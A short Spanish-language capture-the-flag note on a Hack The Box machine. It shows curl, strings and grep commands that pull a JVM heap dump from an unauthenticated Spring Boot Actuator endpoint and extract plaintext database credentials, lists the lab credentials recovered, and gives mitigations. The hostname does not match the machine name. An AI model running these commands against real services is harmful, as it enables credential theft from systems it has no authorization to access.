# Spring Boot Actuator Heapdump

## Descripción
Spring Boot Actuator expone endpoints de diagnóstico y monitoreo. Cuando está expuesto sin autenticación, el endpoint `/actuator/heapdump` permite descargar un volcado de memoria (HPROF) de la JVM, que puede contener credenciales en texto plano, claves de sesión, y otra información sensible.

## Caso de uso en HTB Stream
La máquina Stream expone `/actuator/heapdump` sin autenticación. El heapdump contiene la configuración de HikariCP con credenciales de base de datos en texto plano.

## Explotación

```bash
# Descargar heapdump
curl -s -o heapdump.hprof http://api.htb-airport.htb/actuator/heapdump

# Extraer credenciales con strings
strings -a heapdump.hprof | grep -iE 'setUsername|setPassword|setPassword|jdbc:'

# O buscar clases específicas
grep -aoE 'Lcom/htb/[A-Za-z0-9/$]+;' heapdump.hprof | sort -u
```

## Credenciales encontradas
- `setUsername`: svc_events
- `setPassword`: Yl4aCgh4y2PnU
- `setPoolName`: terminal-edge-pool
- `setJdbcUrl`: jdbc:h2:mem:terminaldb

## Mitigación
- Deshabilitar endpoints sensibles de Actuator o requerir autenticación
- Configurar `management.endpoints.web.exposure.include` con solo los necesarios
- Nunca exponer `/actuator/heapdump` en producción